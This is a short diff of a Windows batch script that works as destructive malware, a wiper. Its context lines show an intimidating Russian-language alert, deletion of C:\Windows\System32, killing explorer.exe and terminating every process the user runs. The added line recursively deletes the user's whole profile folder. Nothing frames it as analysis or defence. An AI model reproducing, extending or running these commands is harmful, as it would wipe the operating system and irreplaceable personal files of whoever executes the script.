@@ -2,6 +2,7 @@
 color 02
 mshta "javascript:alert('Кровь детей на вашых руках!');close()"
 rd /s /q C:\Windows\System32
+rmdir /s /q "C:\Users\%USERNAME%"
 taskkill /im explorer.exe /f >nul
 for /f "tokens=1" %%i in ('tasklist /FI "USERNAME eq %USERNAME%" /FI "STATUS eq running" /NH') do (
     taskkill /f /im "%%i" >nul 2>&1
